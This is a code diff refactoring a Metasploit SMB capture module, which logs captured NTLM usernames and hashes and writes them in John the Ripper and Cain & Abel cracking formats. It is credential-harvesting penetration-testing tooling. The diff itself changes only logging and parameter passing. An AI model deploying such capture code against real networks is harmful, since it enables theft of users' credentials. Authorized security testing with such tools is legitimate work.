@@ -94,16 +94,26 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         unless hash_type.nil?
-          puts "[SMB] #{hash_type} Client     : #{client}"
-          # puts "[SMB] #{hash_type} Client OS  : #{@client_os_version}"
-          puts "[SMB] #{hash_type} Username   : #{username}"
-          puts "[SMB] #{hash_type} Hash       : #{combined_hash}"
-          puts
+          @provider.listener.print_line "[SMB] #{hash_type} Client     : #{client}"
+          # @provider.listener.print_line "[SMB] #{hash_type} Client OS  : #{@client_os_version}"
+          @provider.listener.print_line "[SMB] #{hash_type} Username   : #{username}"
+          @provider.listener.print_line "[SMB] #{hash_type} Hash       : #{combined_hash}"
+          @provider.listener.print_line
 
           if @provider.listener
             jtr_format = type3_msg.ntlm_version == :ntlmv1 ? 'netntlm' : 'netntlmv2'
-            @provider.listener.on_cred(client, combined_hash, jtr_format, username,
-                                       @server_challenge, client_hash, type3_msg.domain.encode, @client_os_version)
+            @provider.listener.on_cred(
+              {
+                address: client,
+                combined_hash: combined_hash,
+                jtr_format: jtr_format,
+                username: username,
+                server_challenge: @server_challenge,
+                client_hash: client_hash,
+                domain: type3_msg.domain.encode,
+                client_os_version: @client_os_version
+              }
+            )
           end
         end
 
@@ -121,11 +131,11 @@ class MetasploitModule < Msf::Auxiliary
     attr_reader :listener
   end
 
-  def on_cred(address, combined_hash, jtr_format, username, server_challenge, client_hash, domain, _client_os_version)
+  def on_cred(creds)
     if active_db?
       origin = create_credential_origin_service(
         {
-          address: address,
+          address: creds[:address],
           port: datastore['SRVPORT'],
           service_name: 'smb',
           protocol: 'tcp',
@@ -134,22 +144,22 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
 
-      # TODO: Re-implement when +_client_os_version+ can be determined.
+      # TODO: Re-implement when +creds[:client_os_version]+ can be determined.
       # found_host = framework.db.hosts.find_by(address: address)
-      # found_host.os_name = _client_os_version
+      # found_host.os_name = creds[:client_os_version]
       # found_host.save!
 
       create_credential(
         {
           origin: origin,
           origin_type: :service,
-          address: address,
+          address: creds[:address],
           service_name: 'smb',
           port: datastore['SRVPORT'],
-          private_data: combined_hash,
+          private_data: creds[:combined_hash],
           private_type: :nonreplayable_hash,
-          jtr_format: jtr_format,
-          username: username,
+          jtr_format: creds[:jtr_format],
+          username: creds[:username],
           module_fullname: fullname,
           workspace_id: myworkspace_id
         }
@@ -163,17 +173,17 @@ class MetasploitModule < Msf::Auxiliary
       # JTR NTLM hash format NTLMv2
       # Username::Domain:Challenge:NTHash[0...16]:NTHash[16...-1]
 
-      File.open(File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root), 'a') do |f|
-        f.puts(combined_hash)
+      File.open(File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root), 'ab') do |f|
+        f.puts(creds[:combined_hash])
       end
     end
 
     # Cain & Abel doesn't support import of NTLMv2 hashes
-    if datastore['CAINPWFILE'] && jtr_format == 'netntlm'
+    if datastore['CAINPWFILE'] && creds[:jtr_format] == 'netntlm'
       # Cain&Abel hash format
       # Username:Domain:Challenge:LMHash:NTLMHash
-      File.open(File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root), 'a') do |f|
-        f.puts("#{username}:#{domain}:#{server_challenge}:#{client_hash}")
+      File.open(File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root), 'ab') do |f|
+        f.puts("#{creds[:username]}:#{creds[:domain]}:#{creds[:server_challenge]}:#{creds[:client_hash]}")
       end
     end
   end
